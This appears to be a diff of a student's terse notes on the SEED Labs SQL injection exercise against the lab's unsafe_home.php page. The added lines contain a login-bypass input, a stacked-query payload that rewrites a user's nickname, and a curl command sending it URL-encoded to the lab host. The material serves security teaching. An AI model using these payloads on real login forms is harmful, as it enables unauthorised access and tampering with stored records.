@@ -8,6 +8,8 @@ SELECT * FROM credential WHERE name = 'Alice';
 3.1..........
 2.1..
 admin' #
+boby' #
+
 
 checkfile..
 cd /var/www/SQLInjection/
@@ -29,8 +31,16 @@ curl 'http://www.SEEDLabSQLInjection.com/unsafe_home.php?username=admin%27%20%23
 %23-#
 
 2.3 ...
+unsafe.php
 not possible .because conn->query takes one single query
-if you want to run the make conn->query to conn->multi_query($sql)) 
+if you want to run the make first conn->query to conn->multi_query($sql)) 
+
+solution...
+alice'; UPDATE credential SET nickname='hacked_alice' WHERE name='alice'; #
+
+terminal:
+curl 'http://www.SEEDLabSQLInjection.com/unsafe_home.php?username=alice%27%3B%20UPDATE%20credential%20SET%20nickname%3D%27hacked_alice%27%20WHERE%20name%3D%27alice%27%3B%20%23&Password=abc'
+
 
 3..
 
